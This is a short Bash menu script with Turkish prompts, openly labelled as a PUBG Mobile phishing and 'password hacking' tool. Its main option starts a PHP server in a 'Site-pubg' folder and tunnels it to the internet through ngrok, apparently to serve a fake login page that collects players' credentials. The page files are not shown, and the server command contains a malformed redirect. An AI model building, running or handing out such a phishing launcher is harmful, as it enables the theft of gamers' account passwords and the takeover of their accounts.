#!/bin/bash

#PUBG PHİSHİNG
#HACK
#github
#password hacking
clear
echo -e  "


\e[35m     ((( #PUBG MOBİLE  #PHİSHİNG )))




\e[31m[01]\e[32m Pubg



\e[31m[99]\e[37m Exit
"
echo -e "\e[49m"
read -p "İşlem Numarasını Giriniz: " islem
if [[ $islem == 1 || $islem == 01 ]]; then
     read -p "Port Giriniz: " port
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
        sleep 4
        cd Site-pubg/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 0 || $islem == 00 ]]; then
cd ..
cd ..
bash tst.sh
elif [[ $islem == 9 || $islem == 99 ]]; then
clear
echo -e "\e[31m İyi Günler Diler :)) ßß"
exit 1
else
echo ""
echo -e "\e[31m Girdiğiniz İşlem Numarasını Kontrol Ediniz...."
sleep 3
clear
bash start.sh
fi
